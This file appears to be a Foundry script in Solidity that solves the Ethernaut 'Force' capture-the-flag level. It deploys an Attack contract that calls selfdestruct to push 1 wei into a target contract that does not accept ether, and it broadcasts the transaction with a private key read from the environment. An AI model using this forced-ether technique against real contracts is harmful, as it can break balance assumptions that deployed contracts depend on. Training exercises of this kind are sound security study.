pragma solidity ^0.8.0;
import "../src/Force.sol";
import "@forge-std/Script.sol";

contract Attack is Script {
    address public sendto;
    constructor(address sendTo) {
        sendto = sendTo;
    }
    function attack() public payable{
        selfdestruct(payable(sendto));
    }
}

contract ForceScript is Script {

    Force public forceContract;

    function setUp() public {
        forceContract = Force(payable(vm.envAddress("FORCE_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack a = new Attack(address(forceContract));
        a.attack{value: 1 wei}();
        vm.stopBroadcast();
    }

}